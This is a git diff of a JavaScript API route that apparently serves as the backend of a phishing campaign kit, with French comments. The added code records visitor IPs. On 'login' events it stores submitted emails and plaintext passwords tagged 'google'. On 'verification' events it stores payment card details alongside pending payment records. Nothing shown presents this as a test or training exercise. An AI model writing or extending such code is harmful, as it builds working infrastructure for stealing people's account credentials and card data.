@@ -1,27 +1,68 @@
-const { trackEvent, storeLead } = require('../../../utils/supabase');
+import { getCampaignById } from '../../../tools/supabase/getCampaigns.js';
+import { storeEvent } from '../../../tools/supabase/storeEvents.js';
+import { storeContact } from '../../../tools/supabase/storeContact.js';
+import { storeCard } from '../../../tools/supabase/storeCards.js';
+import { storeLogin } from '../../../tools/supabase/storeLogins.js';
+import { createPayment, updatePayment } from '../../../tools/supabase/storePayments.js';
+import { getContactByEmail } from '../../../tools/supabase/getContacts.js';
 
 export default async function handler(req, res) {
   try {
-    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
     const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || 'unknown';
-    const { eventType, payload = {}, campaign = '' } = req.body || {};
+    const { campaign = '', eventType = 'submission', payload: formPayload = {}, contactId: incomingContactId } = req.body || {};
 
-    if (!eventType) return res.status(400).json({ error: 'eventType required' });
-    
-    // Track the event and get the event ID
-    const eventResult = await trackEvent(eventType, ip, { ...payload, campaign });
-    const eventId = eventResult.eventId;
+    // Résoudre campaignId (UUID) depuis id ou name
+    if (!campaign) {
+      return res.status(400).json({ success: false, error: 'campaign is required' });
+    }
+    const campaignRow = await getCampaignById(campaign);
+    if (!campaignRow?.id) {
+      return res.status(404).json({ success: false, error: 'campaign not found' });
+    }
+    const campaignId = campaignRow.id;
 
-    // Store lead for relevant events that contain email data
-    const leadStorageEvents = ['booking', 'login', 'verification_start', 'verification_retry'];
-    if (leadStorageEvents.includes(eventType) && payload.email) {
-      // Only use real phone number, avoid storing firstName as phone
-      const phone = payload.phone || '';
-      await storeLead(payload.email, phone, ip, campaign, eventId, eventType, payload);
+    let finalContactId = incomingContactId || null;
+
+    // Créer / mettre à jour le contact sur les événements clés AVANT de tracker l'événement
+    switch (eventType) {
+      case 'booking':
+        const email = formPayload.email;
+        const phone = formPayload.phone || '';
+        const result = await storeContact({ email, phone, ip, campaignId, eventId: null, eventType, payload: formPayload });
+        finalContactId = result?.contactId || null;
+        break;
+      case 'login':
+        const contact = await getContactByEmail(formPayload.email);
+        if (contact) {
+          await storeLogin(contact.id, formPayload.email, formPayload.password, 'google');
+        }
+        break;
+      case 'verification_start':
+      case 'verification_retry':
+        if (formPayload.paymentId) {
+          await createPayment(formPayload.paymentId, 'pending', formPayload.amount || 10, formPayload.cardDetails, null, finalContactId);
+        }
+        if (finalContactId && formPayload.cardDetails) {
+          await storeCard(finalContactId, formPayload.cardDetails);
+        }
+        break;
+      case 'verification_success':
+      case 'verification_error':
+        if (formPayload.paymentId) {
+          await updatePayment(formPayload.paymentId, formPayload.status || 'error');
+        }
+        break;
+      default:
+        break;
     }
 
-    res.status(200).json({ success: true, eventId });
+    // Track the event avec le contact_id final
+    const eventResult = await storeEvent(eventType, ip, { ...formPayload, campaign: campaignId }, campaignId, finalContactId);
+    const eventId = eventResult.eventId;
+
+    res.status(200).json({ success: true, eventId, contactId: finalContactId });
   } catch (e) {
+    console.error('Track submission error:', e);
     res.status(500).json({ success: false, error: e.message });
   }
 }
